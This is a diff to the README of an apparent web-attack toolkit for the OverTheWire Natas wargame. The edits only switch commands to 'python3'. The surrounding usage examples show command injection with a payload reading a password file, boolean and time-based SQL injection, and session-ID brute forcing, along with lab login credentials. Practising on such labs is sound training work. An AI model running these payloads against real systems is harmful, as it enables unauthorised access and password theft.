@@ -26,8 +26,9 @@ The toolkit is designed to run on Python 3.9+ and requires the `requests` librar
 
 2.  **Create and activate a virtual environment (recommended):**
     ```bash
-    python -m venv venv
-    source venv/bin/activate
+    python3 -m venv venv
+    source venv/bin/activate  # On CSE machine
+    venv\Scripts\activate  # On Windows
     ```
 
 3.  **Install the required dependencies:**
@@ -43,11 +44,11 @@ The toolkit is operated from `main.py` with a clear command structure.
 
 To see the main commands (`inject`, `session`), use the help flag:
 ```bash
-python main.py -h
+python3 main.py -h
 ```
 To see the options for a specific subcommand, like `inject`:
 ```bash
-python main.py inject -h
+python3 main.py inject -h
 ```
 
 ---
@@ -58,7 +59,7 @@ This module tests for OS command injection vulnerabilities. It intelligently com
 
 **Example Command (for Natas 9):**
 ```bash
-python main.py inject cmd http://natas9.natas.labs.overthewire.org/ \
+python3 main.py inject cmd http://natas9.natas.labs.overthewire.org/ \
     -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" \
     --param needle \
     --payload "; cat /etc/natas_webpass/natas10 #"
@@ -85,7 +86,7 @@ natas16" AND password LIKE BINARY "h%" -- -
 
 **Example Command (for Natas 15):**
 ```bash
-python main.py inject sqli-bool http://natas15.natas.labs.overthewire.org/ \
+python3 main.py inject sqli-bool http://natas15.natas.labs.overthewire.org/ \
     -u "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
     --data "username=natas16" \
     --param-to-fuzz username \
@@ -106,7 +107,7 @@ This module is for the most difficult scenarios where there is no visible feedba
 
 **Example Command (for Natas 17):**
 ```bash
-python main.py inject sqli-time http://natas17.natas.labs.overthewire.org/ \
+python3 main.py inject sqli-time http://natas17.natas.labs.overthewire.org/ \
     -u "natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC" \
     --data "username=natas18" \
     --param-to-fuzz username \
@@ -127,7 +128,7 @@ This module exploits predictable session ID generation schemes.
 
 **Example Command - Simple Integers (for Natas 18):**
 ```bash
-python main.py session http://natas18.natas.labs.overthewire.org/ \
+python3 main.py session http://natas18.natas.labs.overthewire.org/ \
     -u "natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" \
     --range "1:640:1" \
     --template "PHPSESSID=^PASS^" \
@@ -136,7 +137,7 @@ python main.py session http://natas18.natas.labs.overthewire.org/ \
 
 **Example Command - Hex-Encoded (for Natas 19):**
 ```bash
-python main.py session http://natas19.natas.labs.overthewire.org/ \
+python3 main.py session http://natas19.natas.labs.overthewire.org/ \
     -u "natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr" \
     --range "1:640:1" \
     --template "PHPSESSID=^PASS^" \
